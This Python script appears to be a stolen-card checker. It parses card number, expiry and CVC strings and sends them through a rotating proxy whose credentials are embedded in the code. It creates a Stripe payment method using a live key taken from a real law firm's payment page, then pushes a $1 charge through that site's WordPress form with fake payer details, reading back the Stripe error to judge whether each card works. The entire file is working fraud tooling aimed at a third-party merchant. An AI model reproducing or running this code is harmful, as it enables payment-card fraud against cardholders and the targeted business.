import requests,re
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "p.webshare.io:80:rotate-youavbwz:ej3yf2dnj71t"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F6296643727%3B+stripe-js-v3%2F6296643727%3B+card-element&key=pk_live_51RCo52AslObX1XoIQQONaUwrBhGaGWOcwotVtFuDJyfIcKzl5F1W0WcnpVFBJWLXRwXyJ0ZNPAPFeoJwl1n8ghMv00fQvbzbVW'
	
	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'avagyanlaw.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://avagyanlaw.com',
	    'referer': 'https://avagyanlaw.com/payments/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1751948377848',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=370&_fluentform_9_fluentformnonce=6a9ebc73b0&_wp_http_referer=%2Fpayments%2F&email_9=rodamuser08%40gmail.com&phone=4303000850&name_7%5Bfirst_7_3%5D=Rodam&name_7%5Blast_7_6%5D=User&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&address_1%5Bcountry%5D=&input_text=&input_radio=Single%20Payment&custom-payment-amount_1=1&payment_method=stripe&payment-coupon=&terms-n-condition=on&__ff_all_applied_coupons=&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '9',
	}
	
	response = session.post(
	    'https://avagyanlaw.com/wp-admin/admin-ajax.php',
	    params=params,
	    headers=headers,
	    data=data,
	)
	
	try:
		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
	except:
		result = response.text
		
	return (result)
